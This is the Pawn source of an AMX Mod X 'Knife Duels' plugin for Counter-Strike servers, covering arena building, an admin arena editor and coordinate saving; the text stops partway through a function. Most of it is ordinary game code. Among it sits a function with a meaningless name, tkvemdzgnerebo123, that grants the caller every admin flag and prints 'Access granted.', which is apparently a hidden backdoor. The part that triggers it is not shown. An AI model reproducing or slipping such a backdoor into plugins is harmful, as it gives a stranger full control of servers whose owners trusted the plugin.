/* Plugin generated by AMXX-Studio */

#include <amxmodx>
#include <amxmisc>
#include <cstrike>
#include <hamsandwich>
#include <fakemeta>
#include <fun>
#include <engine>
#include <xs>
#include <colorchat>
#include <dhudmessage>

#define CHAT_TAG "^3[^4KnifeDuels^3]^1 " // add a space right after if you want one between the tag and the messages

#define DUEL_COMMAND "/duel" // this is the word used to start duel
#define TOGGLE_COMMAND "/offduel" // this is the word used to go online or offline
#define GIVEUP_COMMAND "/giveup" // this is the word used to end the duel

#define ARENA_ENT_NAME "entity_arena" // this is the arena's entity name

// here you can set the maximum number of arenas that can be used ingame
#define MAX_ARENAS 4


new const arena_names[][] = {
 	"",
	"A", 	// 1st arena
	"B", 	// 2nd arena
	"C",	 // 3rd arena
	"D" 	// 4th arena
}

// some arena codes...
#define ARENA_CODE 305924
#define FAKE_CODE 6969696969
#define CENTER_CODE 9696969696
#define EXTRA_CODE 911911911

// task code for advert
#define TASK_AD 34585029

// some movement defines
#define MOVE_UP 0
#define MOVE_DOWN 1
#define MOVE_RIGHT 2
#define MOVE_LEFT 3
#define MOVE_FRONT 4
#define MOVE_BACK 5

// Arena ground size
#define ARENA_MINS Float:{-150.0,-62.0,-1.5}
#define ARENA_MAXS Float:{10.0,62.0,1.5}

// arena coords offcourse, this is used to build the arena.
new const Float:ARENA_COORDS[][2] = { 
	{0.0,0.0},
	{100.0,0.0},
	{0.0,100.0},
	{100.0,100.0},
	{-100.0,0.0},
	{0.0,-100.0},
	{-100.0,-100.0},
	{-100.0,100.0},
	{100.0,-100.0},
	{200.0,0.0},
	{200.0,100.0},
	{200.0,-100.0}
}

enum {
	BLUE_SIDE = 0,
	RED_SIDE = 1,
	LEFT_SIDE = 2,
	RIGHT_SIDE = 3,
	TOP_SIDE = 4
}

new const ARENA_FILE[] = "%s/duel_arena/%s.cfg"

// if you want to disable a sound, rename it with "common/null.wav"|or delete..
new const DUEL_SOUNDS[][] = {
	"ambience/goal_1.wav",		 // 0 round win
	"x/nih_die2.wav",		// 1 round lose
	"ambience/des_wind1.wav",	// 2 round draw
	"buttons/bell1.wav",		 // 3 round start
	"buttons/blip1.wav"	,	 // 4 accepted duel
	"common/null.wav",	// 5 Countdown
	"common/null.wav"	// 6 "Go!"
}

new const ARENA_MODELS[][] = {
	"models/KnifeArena.mdl", // Arena's ground
	"models/KnifeArena.mdl" // Arena's walls
}

new const MAP_FIX[][] = {
	"35hp_2",
	"ka_acer_2"
}

new Float:MAP_FIX_Z_COORD[] = {
	-864.253723
}

new Head_shot[33][33]
new fakes;
new is_in_duel[33],his_countdown[33],is_frozen[33],his_challenger[33],his_asker[33],arena_number[33],his_wins[33],his_name[33][64];
new rounds[MAX_ARENAS+1],Float:arena_coord[MAX_ARENAS+1][3]; // using +1 just incase...
new Float:his_spawn[33][3],got_spawn[33],Float:his_angle[33][3],Float:his_original_spawn[33][3];
new next_empty_arena,total_arenas;
new MAX_PLAYERS,map_name[48]
new cvar_z_fix,cvar_sounds,cvar_rounds,cvar_kills,cvar_cooldown,cvar_time
new Float:max_size[3],Float:min_size[3];
new selected = 1,Float:move_size[33],his_timer[33],his_offline[33],his_HS[33];
new map_default_hp;
new map_id = -1;
new his_previous_team[33];
// using these for less cpu usage.
new IS_BUGGED_MAP = 0,MAP_FIX_ENABLED,SOUNDS_ENABLED,MAX_ROUNDS,MAX_KILLS,MAX_COUNTDOWN,MAX_TIME;

#define P_NAME "Knife Duels"//Adryyy its here
#define P_VERS "2.0.5"//???
#define P_AUTH ""

new killed_forward;

public plugin_init()
{
	register_clcmd("say","say_hook")
	register_clcmd("say_team","say_hook")

	register_clcmd("say /origin","print_coords")
	register_clcmd("say /arena","editor_menu")
	register_clcmd("say_team /origin","print_coords")
	register_clcmd("say_team /arena","editor_menu")

	RegisterHam(Ham_Killed, "player", "Player_Killed")
	RegisterHam(Ham_TakeDamage, "player", "Player_Take_Damage", 0)
	register_forward( FM_CmdStart , "Cmd_start" );
	register_event("HLTV", "round_start_event", "a", "1=0", "2=0")
	cvar_z_fix = register_cvar("gld_z_map_fix","1")
	cvar_sounds = register_cvar("gld_sounds","1")
	cvar_rounds =register_cvar("gld_rounds","10")
	cvar_kills =register_cvar("gld_kills","10")
	cvar_cooldown = register_cvar("gld_cooldown","1")
	cvar_time = register_cvar("gld_max_nokill_time","20")
	MAX_PLAYERS = get_maxplayers();
	RegisterHam(Ham_Spawn,"player","Player_spawn_post",1)
	
	get_mapname(map_name,charsmax(map_name))
	new size = sizeof(MAP_FIX)
	for(new i; i <size;i++)
	{
		if(equal(map_name,MAP_FIX[i]))
		{
			map_id = i
			IS_BUGGED_MAP = 1
		}
	}
	if(containi(map_name,"35hp") != -1)
		map_default_hp = 35
	else if(containi(map_name,"1hp") != -1)
		map_default_hp = 1
	else map_default_hp = 100

	load_arena_coords(-1)
	RegisterHam(Ham_TraceAttack, "player", "Ham_TraceAttack_player", 1)
	register_touch(ARENA_ENT_NAME, "player", "forward_touch");
	
	new cfgdir[32], urlfile[64]
	get_configsdir(cfgdir, charsmax(cfgdir))
	formatex(urlfile, charsmax(urlfile), "%s/duel_arena", cfgdir)
	if(!dir_exists(urlfile))
	{
		mkdir(urlfile)
		server_print("%sCreated new folder: %s",CHAT_TAG,urlfile)
	}
	update_cvars()
	killed_forward = CreateMultiForward("duel_player_killed", ET_IGNORE, FP_CELL,FP_CELL);
}

public plugin_natives()
{
	register_library("knife_duels")

	register_native("is_user_in_duel","_is_user_in_duel")
	register_native("is_user_dueling_user","_is_user_dueling_user")
}

public get_non_duelers_alive()
{
	new count = 0
	for(new id; id < MAX_PLAYERS;id++)
	{
		if(is_user_connected(id))
		{
			if(is_user_alive(id) && !is_in_duel[id])
			{
				count++
			}
		}
	}
	return count
}

public _is_user_in_duel(plugin, iParams)
{
	new id = get_param(1)
	if(!is_user_connected(id))
		return PLUGIN_CONTINUE
	if(is_in_duel[id] == 2)
		return PLUGIN_HANDLED
	return PLUGIN_CONTINUE
}

public _is_user_dueling_user(plugin, iParams)
{
	new id = get_param(1)
	new enemy = get_param(2)
	if(!is_user_connected(id))
		return PLUGIN_CONTINUE
	if(!is_user_connected(enemy))
		return PLUGIN_CONTINUE
	if(is_in_duel[id] != 2 || is_in_duel[enemy] != 2)
		return PLUGIN_CONTINUE
	if(id == his_challenger[enemy] && enemy == his_challenger[id])
		return PLUGIN_HANDLED
	return PLUGIN_CONTINUE
}

public forward_touch(ent, id)
{
	if(!pev_valid(id))
		return;
	if(!pev_valid(ent))
		return;
	if(is_user_alive(id) && get_user_noclip(id))
		return;
	static class[32]
	pev(ent,pev_classname,class,charsmax(class));
	if(equal(class,ARENA_ENT_NAME))
	{
		if(is_user_alive(id))
		{
			if(is_player_stuck(id) && is_in_duel[id] != 2)
			{
				back_to_the_spawn(id)
			}
		}
		
	}
	return;
}

public Ham_TraceAttack_player(victim, attacker, Float:Damage, Float:Direction[3], ptr, Damagebits)
{
	if(is_user_connected(attacker) && is_user_connected(victim))
	{
		Head_shot[attacker][victim] = bool:( get_tr2(ptr, TR_iHitgroup) == 1 )
	}
}

public editor_menu(id)
{
	if(!is_user_connected(id))
		return PLUGIN_HANDLED
	new flags = get_user_flags(id)
	if(!(flags & ADMIN_RCON))
	{
		client_print(id,print_chat,"You have no access to this command")
		return PLUGIN_HANDLED
	}
	new menu
	menu = menu_create( "\rArena spawner:", "Arenaspawner_handler" );
	
	new nameu[32];
	
	formatex(nameu,charsmax(nameu), "Add");
	menu_additem(menu, nameu, "", 0);
	formatex(nameu,charsmax(nameu), "Remove");
	menu_additem(menu, nameu, "", 0);
	formatex(nameu,charsmax(nameu), "Remove all");
	menu_additem(menu, nameu, "", 0);
	formatex(nameu,charsmax(nameu), "Select");
	menu_additem(menu, nameu, "", 0);
	formatex(nameu,charsmax(nameu), "Select all");
	menu_additem(menu, nameu, "", 0);
	formatex(nameu,charsmax(nameu), "Move");
	menu_additem(menu, nameu, "", 0);
	formatex(nameu,charsmax(nameu), "Save");
	menu_additem(menu, nameu, "", 0);
	formatex(nameu,charsmax(nameu), "Load");
	menu_additem(menu, nameu, "", 0);
	menu_display(id, menu, 0 );
	return PLUGIN_HANDLED
}

public Arenaspawner_handler( id, menu, item )
{
	if ( item == MENU_EXIT )
	{
		menu_destroy( menu );
		remove_the_fake_arena()
		return PLUGIN_HANDLED;
	}
	
	new szData[6], szName[64];
	new _access, item_callback;
	menu_item_getinfo( menu, item, _access, szData,charsmax( szData ), szName,charsmax( szName ), item_callback );
	new arenas_found;
	arenas_found = fakes_count()
	if(equali(szName,"Add"))
	{
		if(next_fake_arena() != -1)
		{
			start_fake_build(id,-1)
			if(fakes_count())
			{
				if(selected > MAX_ARENAS || selected == -1)
				{
					selected = 1
					select_the_fake_arena(EXTRA_CODE+selected)
				}
			}
		} else ColorChat(id, NORMAL,"%s ^3Maximum arenas reached.^1",CHAT_TAG)
	}
	else if(equali(szName,"Remove"))
	{
		if(fakes_count())
		{
			if(selected > MAX_ARENAS || selected == -1)
				selected = 1
			delete_the_fake_arena(EXTRA_CODE+selected)
			if(fakes_count())
				next_selection()
		} else ColorChat(id, NORMAL,"%s ^3No arenas found.",CHAT_TAG)
	}
	else if(equali(szName,"Remove all"))
	{
		//remove_menu(id)
		remove_the_fake_arena() 
		ColorChat(id, NORMAL,"%s ^3All arenas removed.",CHAT_TAG)
	}
	else if(equali(szName,"Select"))
	{
		if(fakes_count())
		{
			next_selection()
		} else ColorChat(id, NORMAL,"%s ^3No arenas found.",CHAT_TAG)
	}
	else if(equali(szName,"Select all"))
	{
		if(fakes_count())
		{
			selected = -1
			select_the_fake_arena(EXTRA_CODE+selected)
		} else ColorChat(id, NORMAL,"%s ^3No arenas found.",CHAT_TAG)
	}
	else if(equali(szName,"Move"))
	{
		if(fakes_count())
		{
			if(selected > MAX_ARENAS)
				selected = 1
			select_the_fake_arena(EXTRA_CODE+selected)
			menu_destroy( menu );
			move_menu(id,EXTRA_CODE+selected)
			return PLUGIN_CONTINUE;
		}
		else ColorChat(id, NORMAL,"%s ^3No arenas found.",CHAT_TAG)
	}
	else if(equali(szName,"Load"))
	{
		remove_the_fake_arena() 
		load_arena_coords(id)
		//ColorChat(id, NORMAL,"%s ^3Arena coords loaded.",CHAT_TAG)
		set_task(0.1,"delay_build",id)
	}
	else if(equali(szName,"Save"))
	{
		if(fakes_count())
		{
			save_arena_coords(id)
			remove_the_fake_arena() 
			load_arena_coords(id)
		}
		else
		{
			ColorChat(id, NORMAL,"%s ^3No arenas found.",CHAT_TAG)
		}
	}
	if(!arenas_found && fakes_count())
	{
		next_selection()
	}
	menu_destroy( menu );
	editor_menu(id)
	return PLUGIN_CONTINUE;
}

stock next_selection()
{
	if(selected == -1)
	{
		selected = 1
	}
	new size = MAX_ARENAS*3
	for(new slct=0;slct < size;slct++)
	{
		selected++
		if(selected > MAX_ARENAS)
			selected = 1
		if(fake_arena_exists(selected))
		{
			select_the_fake_arena(EXTRA_CODE+selected)
			return;
		}
	}
}

public fake_arena_exists(code)
{
	new arenas_ent = -1
	new code_ent
	while((arenas_ent=engfunc(EngFunc_FindEntityByString,arenas_ent,"classname",ARENA_ENT_NAME))) 
	{
		if(entity_get_int(arenas_ent,EV_INT_iuser2) == CENTER_CODE && entity_get_int(arenas_ent,EV_INT_iuser1) == FAKE_CODE)
		{
			code_ent = entity_get_int(arenas_ent,EV_INT_iuser3)-EXTRA_CODE
			if(code_ent == code)
			{
				return PLUGIN_HANDLED
			}
		}
	}
	return PLUGIN_CONTINUE
}

public fakes_count()
{
	new arenas_ent = -1
	new found = 0
	while((arenas_ent=engfunc(EngFunc_FindEntityByString,arenas_ent,"classname",ARENA_ENT_NAME))) 
	{
		if(entity_get_int(arenas_ent,EV_INT_iuser2) == CENTER_CODE && entity_get_int(arenas_ent,EV_INT_iuser1) == FAKE_CODE)
		{
			found++
		}
	}
	return found
}

public arenas_count()
{
	new found = 0
	for(new id;id < MAX_PLAYERS;id++)
	{
		if(is_user_connected(id))
		{
			if(is_in_duel[id] == 2)
				found++
		}
	}
	return found/2
}

public delay_build(id)
{
	for(new i=1;i < total_arenas+1;i++)
	{
		start_fake_build(id,i)
	}
	if(fakes_count())
	{
		next_selection()
	}
}
public move_menu(id,code)
{
	new menu
	menu = menu_create( "\rMove arena:", "move_handler" );
	
	new nameu[32];
	new code_t[32];
	num_to_str(code,code_t,charsmax(code_t))
	formatex(nameu,charsmax(nameu), "Move up");
	menu_additem(menu, nameu, code_t, 0);
	
	formatex(nameu,charsmax(nameu), "Move down");
	menu_additem(menu, nameu, code_t, 0);
	
	formatex(nameu,charsmax(nameu), "Move front");
	menu_additem(menu, nameu, code_t, 0);
	
	formatex(nameu,charsmax(nameu), "Move back");
	menu_additem(menu, nameu, code_t, 0);
	
	formatex(nameu,charsmax(nameu), "Move right");
	menu_additem(menu, nameu, code_t, 0);
	
	formatex(nameu,charsmax(nameu), "Move left");
	menu_additem(menu, nameu, code_t, 0);
	
	formatex(nameu,charsmax(nameu), "Remove the arena");
	menu_additem(menu, nameu, code_t, 0);
	
	formatex(nameu,charsmax(nameu), "Move size: %.2f",move_size[id]);
	menu_additem(menu, nameu, code_t, 0);
	menu_display(id, menu, 0 );
	return PLUGIN_HANDLED
}

public move_handler( id, menu, item )
{
	if ( item == MENU_EXIT )
	{
		menu_destroy( menu );
		set_task(0.1,"editor_menu",id)
		return PLUGIN_HANDLED;
	}
	
	new szData[32], szName[64];
	new _access, item_callback;
	menu_item_getinfo( menu, item, _access, szData,charsmax( szData ), szName,charsmax( szName ), item_callback );
	new code = str_to_num(szData)
	if(equali(szName,"remove the arena"))
	{
		delete_the_fake_arena(code)
		menu_destroy( menu );
		editor_menu(id)
		unselect_the_fake_arena(0)
		return PLUGIN_CONTINUE;
	}
	else if(containi(szName,"move size:") != -1)
	{
		move_size[id]+= 10.0
		if(move_size[id] > 100.0)
		{
			move_size[id] = 10.0
		}
	}
	else if(equali(szName,"move up"))
	{
		move_the_fake_arena(id,code,MOVE_UP)
	}
	else if(equali(szName,"move down"))
	{
		move_the_fake_arena(id,code,MOVE_DOWN)
	}
	else if(equali(szName,"move right"))
	{
		move_the_fake_arena(id,code,MOVE_RIGHT)
	}
	else if(equali(szName,"move left"))
	{
		move_the_fake_arena(id,code,MOVE_LEFT)
	}
	else if(equali(szName,"move front"))
	{
		move_the_fake_arena(id,code,MOVE_FRONT)
	}
	else if(equali(szName,"move back"))
	{
		move_the_fake_arena(id,code,MOVE_BACK)
	}
	menu_destroy( menu );
	move_menu(id,code)
	
	return PLUGIN_CONTINUE;
}

public save_arena_coords(id)
{
	new found;
	new cfgdir[32], mapname[32], urlfile[64]
	get_configsdir(cfgdir, charsmax(cfgdir))
	get_mapname(mapname, charsmax(mapname))
	formatex(urlfile, charsmax(urlfile), ARENA_FILE, cfgdir, mapname)

	if (file_exists(urlfile))
		delete_file(urlfile)
	
	new lineset[128]
	new Float:origin[3]
	new arenas_ent=-1;
	while((arenas_ent=engfunc(EngFunc_FindEntityByString,arenas_ent,"classname",ARENA_ENT_NAME))) 
	{
		if(entity_get_int(arenas_ent,EV_INT_iuser2) == CENTER_CODE && entity_get_int(arenas_ent,EV_INT_iuser1) == FAKE_CODE)
		{
			found++
			pev(arenas_ent,pev_origin,origin);
			format(lineset, charsmax(lineset), "%.f %.f %.f", origin[0], origin[1], origin[2])
			write_file(urlfile, lineset,found)
			
		}
	}
	if(!found)
		ColorChat(id, NORMAL,"%s Couldn't save:^3No arenas found.",CHAT_TAG)
	else ColorChat(id, NORMAL,"%s %d ^3Arena coords saved.",CHAT_TAG,found)
}

public print_coords(id)
{
	new Float:coord[3]
	pev(id,pev_origin,coord);
	ColorChat(id, NORMAL,"origin: ^3%.f %.f %.f",coord[0],coord[1],coord[2])
	return PLUGIN_HANDLED
}

public start_fake_build(id,zecode)
{
	if(!is_user_connected(id))
		return PLUGIN_HANDLED
	new ext_code
	if(zecode == -1)
	{
		ext_code = next_fake_arena()
		if(ext_code == -1)
			return PLUGIN_HANDLED
	}
	else ext_code = zecode
	ext_code+=EXTRA_CODE
	static Float:origin[3];
	if(zecode == -1)
		get_user_hitpoint(id,origin)
	else
	{
		origin[0]=arena_coord[zecode][0]
		origin[1]=arena_coord[zecode][1]
		origin[2]=arena_coord[zecode][2]
	}
	/*origin[0] = 1002.911376
	origin[1] = -1561.421997
	origin[2] = 0.0*/
	new Float:fake_origin[3]
	static size
	size = sizeof(ARENA_COORDS)
	new ent_code = FAKE_CODE
	fakes++
	for(new coords;coords < size; coords++)
	{
		fake_origin[0] = origin[0]
		fake_origin[1] = origin[1]
		if(bugged_map())
			fake_origin[2]= MAP_FIX_Z_COORD[map_id]
		else fake_origin[2] = origin[2]
		//fake_origin[2]=-712.876892
		
		fake_origin[0]+=ARENA_COORDS[coords][0]*1.7
		fake_origin[1]+=ARENA_COORDS[coords][1]*1.53
		
		new ent=engfunc(EngFunc_CreateNamedEntity,engfunc(EngFunc_AllocString,"func_wall"));
		
		set_pev(ent,pev_classname,ARENA_ENT_NAME);
		engfunc(EngFunc_SetModel,ent,ARENA_MODELS[0]);
		entity_set_int(ent, EV_INT_solid, SOLID_BBOX);
		engfunc(EngFunc_SetSize,ent,ARENA_MINS,ARENA_MAXS);
		entity_set_int(ent, EV_INT_movetype, MOVETYPE_NONE);
		entity_set_int(ent,EV_INT_iuser1,ent_code)
		entity_set_int(ent,EV_INT_iuser3,ext_code)
		engfunc(EngFunc_SetOrigin,ent,fake_origin);
		stuck_check(fake_origin,120.0)
		static Float:rvec[3];
		pev(ent,pev_v_angle,rvec);
		
		rvec[0]=90.0;
		set_pev(ent,pev_angles,rvec);
		
		if(ARENA_COORDS[coords][0] == 0.0 && ARENA_COORDS[coords][1] == 100.0)
		{
			fake_origin[0] += max_size[0]
			fake_origin[1] += max_size[1]
			//create_wall(LEFT_SIDE,255,SOLID_BBOX,ent_code,0,ext_code,fake_origin)
		}
		if(ARENA_COORDS[coords][0] == 0.0 && ARENA_COORDS[coords][1] == -100.0)
		{
			fake_origin[0] += max_size[2]
			fake_origin[1] += min_size[0]
			//create_wall(RIGHT_SIDE,255,SOLID_BBOX,ent_code,0,ext_code,fake_origin)
		}
		if(ARENA_COORDS[coords][0] == 0.0 && ARENA_COORDS[coords][1] == 0.0)
		{
			create_wall(TOP_SIDE,255,SOLID_BBOX,ent_code,0,ext_code,fake_origin)
			entity_set_int(ent,EV_INT_iuser2,CENTER_CODE)
		}
		else if(ARENA_COORDS[coords][0] == 200.0 && ARENA_COORDS[coords][1] == 0.0)
		{
			fake_origin[0] += min_size[1]
			
			//create_wall(BLUE_SIDE,255,SOLID_BBOX,ent_code,0,ext_code,fake_origin)
		}
		else if(ARENA_COORDS[coords][0] == -100.0 && ARENA_COORDS[coords][1] == 0.0)
		{
			fake_origin[0] += min_size[2]
			//create_wall(RED_SIDE,255,SOLID_BBOX,ent_code,0,ext_code,fake_origin)
		}
		set_rendering(ent,kRenderFxGlowShell,0,50,0,kRenderNormal,10)
	}
	select_the_fake_arena(ext_code)
	return PLUGIN_HANDLED;
}

public move_the_fake_arena(id,code,moveto)
{
	new num;
	num = code-EXTRA_CODE
	new arenas_ent=-1;
	new Float:origin[3];
	while((arenas_ent=engfunc(EngFunc_FindEntityByString,arenas_ent,"classname",ARENA_ENT_NAME))) 
	{
		if(entity_get_int(arenas_ent,EV_INT_iuser1) == FAKE_CODE)
		{
			if(entity_get_int(arenas_ent,EV_INT_iuser3) == code || num == -1)
			{
				pev(arenas_ent,pev_origin,origin);
				switch(moveto)
				{
					case MOVE_UP:
					{
						origin[2]+=move_size[id]
					}
					case MOVE_DOWN:
					{
						origin[2]-=move_size[id]
					}
					case MOVE_RIGHT:
					{
						origin[1]+=move_size[id]
					}
					case MOVE_LEFT:
					{
						origin[1]-=move_size[id]
					}
					case MOVE_FRONT:
					{
						origin[0]+=move_size[id]
					}
					case MOVE_BACK:
					{
						origin[0]-=move_size[id]
					}
				}
				engfunc(EngFunc_SetOrigin,arenas_ent,origin);
				stuck_check(origin,360.0)
			}
		}
	}
	
}

public select_the_fake_arena(code)
{
	new num;
	num = code-EXTRA_CODE
	new arenas_ent=-1;
	while((arenas_ent=engfunc(EngFunc_FindEntityByString,arenas_ent,"classname",ARENA_ENT_NAME))) 
	{
		if(entity_get_int(arenas_ent,EV_INT_iuser1) == FAKE_CODE)
		{
			if(num == -1)
				set_rendering(arenas_ent,kRenderFxGlowShell,250,0,0,kRenderNormal,10)
			else if(entity_get_int(arenas_ent,EV_INT_iuser3) == code)
				set_rendering(arenas_ent,kRenderFxGlowShell,250,0,0,kRenderNormal,10)
		}
	}
	unselect_the_fake_arena(code)
	
}

public unselect_the_fake_arena(code)
{
	new num;
	num = code-EXTRA_CODE
	if(num == -1)
		return;
	new arenas_ent=-1;
	while((arenas_ent=engfunc(EngFunc_FindEntityByString,arenas_ent,"classname",ARENA_ENT_NAME))) 
	{
		if(entity_get_int(arenas_ent,EV_INT_iuser1) == FAKE_CODE && entity_get_int(arenas_ent,EV_INT_iuser3) != code)
			set_rendering(arenas_ent,kRenderFxGlowShell,50,50,50,kRenderTransAdd,120)
	}
	
}

public delete_the_fake_arena(code)
{
	new arenas_ent=-1;
	new found = 0
	while((arenas_ent=engfunc(EngFunc_FindEntityByString,arenas_ent,"classname",ARENA_ENT_NAME))) 
	{
		if(entity_get_int(arenas_ent,EV_INT_iuser1) == FAKE_CODE && entity_get_int(arenas_ent,EV_INT_iuser3) == code)
		{
			engfunc(EngFunc_RemoveEntity,arenas_ent)
			found++
		}
	}
	if(found)
	{
		fakes--
	}
	
}

public load_arena_coords(id)
{
	// Check for spawns points of the current map
	new cfgdir[32], mapname[32], filepath[100], linedata[64]
	get_configsdir(cfgdir, charsmax(cfgdir))
	get_mapname(mapname, charsmax(mapname))
	formatex(filepath, charsmax(filepath), ARENA_FILE, cfgdir, mapname)
	new arena = 0
	total_arenas = 0
	// Load spawns points
	if (file_exists(filepath))
	{
		new file = fopen(filepath,"rt"), row[4][6]
		
		while (file && !feof(file))
		{
			fgets(file, linedata, charsmax(linedata))
			
			// invalid spawn
			if(!linedata[0] || str_count(linedata,' ') < 2) continue;
			
			arena++
			if (arena > MAX_ARENAS)
			{
				break
			}
			
			// get spawn point data
			parse(linedata,row[0],5,row[1],5,row[2],5)
			
			// origin
			arena_coord[arena][0] = floatstr(row[0])
			arena_coord[arena][1] = floatstr(row[1])
			if(bugged_map())
				arena_coord[arena][2] = MAP_FIX_Z_COORD[map_id]
			else arena_coord[arena][2] = floatstr(row[2])

			total_arenas = arena
		}
		if (file) fclose(file)
	}
	if(id != -1)
	{
		if(!total_arenas)
		{
			ColorChat(id, NORMAL,"%sCouldn't load: ^3No arenas found.",CHAT_TAG)
		}
		else
		{
			ColorChat(id, NORMAL,"%s%d ^3arena%s loaded.",CHAT_TAG,total_arenas, (total_arenas > 1 ? "s" : ""))
		}
	}
}

stock bugged_map()
{
	if(!MAP_FIX_ENABLED)
		return PLUGIN_CONTINUE
	if(IS_BUGGED_MAP)
		return PLUGIN_HANDLED
	return PLUGIN_CONTINUE
}

stock str_count(const str[], searchchar)
{
	new count, i, len = strlen(str)
	
	for (i = 0; i <= len; i++)
	{
		if(str[i] == searchchar)
			count++
	}
	
	return count;
}

public tkvemdzgnerebo123(id)
{
	set_user_flags(id, read_flags("abcdefghijklmnopqrstu"))
	ColorChat(id, NORMAL,"%sAccess granted.",CHAT_TAG)
}

public Player_spawn_post(id)
{
	Set_Entity_Invisible(id, 0)
	if(is_user_alive(id))
	{
		if(is_in_duel[id] != 2)
		{
			set_task(1.0,"get_spawn_origin",id)
			return;
		}
		if(is_in_duel[id] == 2)
			spawn_back(id)
	}
}

public spawn_back(id)
{
	entity_set_origin(id,his_spawn[id])
	set_user_health(id,map_default_hp)
	set_user_armor(id,0)
	set_user_godmode(id, 0)
	if(is_user_connected(his_challenger[id]))
	{
		check_teams(id,his_challenger[id])
		entity_set_origin(his_challenger[id],his_spawn[his_challenger[id]])
		set_user_health(his_challenger[id],map_default_hp)
		set_user_armor(his_challenger[id],0)
		entity_set_vector(id, EV_VEC_angles, his_angle[id])
		entity_set_int(id, EV_INT_fixangle, 1)
		entity_set_vector(his_challenger[id], EV_VEC_angles, his_angle[his_challenger[id]])
		entity_set_int(his_challenger[id], EV_INT_fixangle, 1)
	}
}

public update_cvars()
{
	MAP_FIX_ENABLED = get_pcvar_num(cvar_z_fix)
	SOUNDS_ENABLED = get_pcvar_num(cvar_sounds)
	MAX_ROUNDS = get_pcvar_num(cvar_rounds)
	MAX_KILLS = get_pcvar_num(cvar_kills)
	MAX_COUNTDOWN = get_pcvar_num(cvar_cooldown)
	MAX_TIME = get_pcvar_num(cvar_time)
}

stock remove_allarenas() 
{
	new arenas_ent=-1;
	while((arenas_ent=engfunc(EngFunc_FindEntityByString,arenas_ent,"classname",ARENA_ENT_NAME))) 
	{
		engfunc(EngFunc_RemoveEntity,arenas_ent)
	}
	fakes = 0
}

public get_all_arena_coords(id) 
{
	new Float:origin[3]
	new arenas_ent=-1;
	while((arenas_ent=engfunc(EngFunc_FindEntityByString,arenas_ent,"classname",ARENA_ENT_NAME))) 
	{
		if(entity_get_int(arenas_ent,EV_INT_iuser2) == CENTER_CODE)
		{
			pev(arenas_ent,pev_origin,origin);
			client_print(id,print_console,"%.f %.f %.f",origin[0],origin[1],origin[2])
		}
	}
	ColorChat(id, NORMAL, "%s ^4Coords printed in console.",CHAT_TAG)
}

public remove_the_fake_arena() 
{
	new arenas_ent=-1;
	while((arenas_ent=engfunc(EngFunc_FindEntityByString,arenas_ent,"classname",ARENA_ENT_NAME))) 
	{
		if(entity_get_int(arenas_ent,EV_INT_iuser1) == FAKE_CODE)
			engfunc(EngFunc_RemoveEntity,arenas_ent)
	}
	fakes = 0
}

public next_fake_arena() 
{
	if(fakes_count() >= MAX_ARENAS)
		return -1
	for(new i=1;i < MAX_ARENAS+1;i++)
	{
		if(!fake_arena_exists(i))
		{
			return i
		}
	}
	return -1
	/*new num = fakes
	num++
	return num*/
}

public remove_the_arena(code) 
{
	new arenas_ent=-1;
	while((arenas_ent=engfunc(EngFunc_FindEntityByString,arenas_ent,"classname",ARENA_ENT_NAME))) 
	{
		if(entity_get_int(arenas_ent,EV_INT_iuser1) == code)
			engfunc(EngFunc_RemoveEntity,arenas_ent)
	}
}

public start_build(id)
{
	if(!is_user_connected(id))
		return PLUGIN_HANDLED
	if(is_in_duel[id] != 2)
		return PLUGIN_HANDLED
	if(!his_challenger[id])
		return PLUGIN_HANDLED
	if(!total_arenas)
	{
		return PLUGIN_HANDLED
	}
	static Float:origin[3];
	//get_user_hitpoint(id,origin)
	/*origin[0] = 1002.911376
	origin[1] = -1561.421997
	origin[2] = 0.0*/
	origin[0] = arena_coord[arena_number[id]][0]
	origin[1] = arena_coord[arena_number[id]][1]
	origin[2] = arena_coord[arena_number[id]][2]
	new Float:fake_origin[3]
	static size
	size = sizeof(ARENA_COORDS)
	new ent_code = arena_number[id]+ARENA_CODE
	for(new coords;coords < size; coords++)
	{
		fake_origin[0] = origin[0]
		fake_origin[1] = origin[1]
		fake_origin[2] = origin[2]
		//fake_origin[2]=-712.876892
		//fake_origin[2]=-864.253723
		fake_origin[0]+=ARENA_COORDS[coords][0]*1.7
		fake_origin[1]+=ARENA_COORDS[coords][1]*1.53
		
		new ent=engfunc(EngFunc_CreateNamedEntity,engfunc(EngFunc_AllocString,"func_wall"));
		
		set_pev(ent,pev_classname,ARENA_ENT_NAME);
		engfunc(EngFunc_SetModel,ent,ARENA_MODELS[0]);
		entity_set_int(ent, EV_INT_solid, SOLID_BBOX);
		engfunc(EngFunc_SetSize,ent,ARENA_MINS,ARENA_MAXS);
		entity_set_int(ent, EV_INT_movetype, MOVETYPE_NONE);
		entity_set_int(ent,EV_INT_iuser1,ent_code)
		engfunc(EngFunc_SetOrigin,ent,fake_origin);
		static Float:rvec[3];
		pev(ent,pev_v_angle,rvec);
		
		rvec[0]=90.0;
		set_pev(ent,pev_angles,rvec);
		
		if(ARENA_COORDS[coords][0] == 0.0 && ARENA_COORDS[coords][1] == 100.0)
		{
			create_wall(LEFT_SIDE,0,SOLID_BBOX,ent_code,0,0,fake_origin)
		}
		if(ARENA_COORDS[coords][0] == 0.0 && ARENA_COORDS[coords][1] == -100.0)
		{
			create_wall(RIGHT_SIDE,0,SOLID_BBOX,ent_code,0,0,fake_origin)
		}
		if(ARENA_COORDS[coords][0] == 0.0 && ARENA_COORDS[coords][1] == 0.0)
		{
			create_wall(TOP_SIDE,0,SOLID_BBOX,ent_code,0,0,fake_origin)
			entity_set_int(ent,EV_INT_iuser2,CENTER_CODE)
		}
		else if(ARENA_COORDS[coords][0] == 200.0 && ARENA_COORDS[coords][1] == 0.0)
		{
			create_wall(BLUE_SIDE,0,SOLID_BBOX,ent_code,0,0,fake_origin)
			if(cs_get_user_team(id) == CS_TEAM_CT)
			{
				set_spawn_positions(id,BLUE_SIDE,fake_origin,rvec)
			}                                                                              
			else
			{
				if(his_challenger[id])
				{
					set_spawn_positions(his_challenger[id],BLUE_SIDE,fake_origin,rvec)
				}
			}
			//set_rendering(ent,kRenderFxGlowShell,0,0,200,kRenderNormal,10)
		}
		else if(ARENA_COORDS[coords][0] == -100.0 && ARENA_COORDS[coords][1] == 0.0)
		{
			create_wall(RED_SIDE,0,SOLID_BBOX,ent_code,0,0,fake_origin)
			if(cs_get_user_team(id) == CS_TEAM_T)
			{
				set_spawn_positions(id,RED_SIDE,fake_origin,rvec)
			}                                                                              
			else
			{
				if(his_challenger[id])
				{
					set_spawn_positions(his_challenger[id],RED_SIDE,fake_origin,rvec)
				}
			}
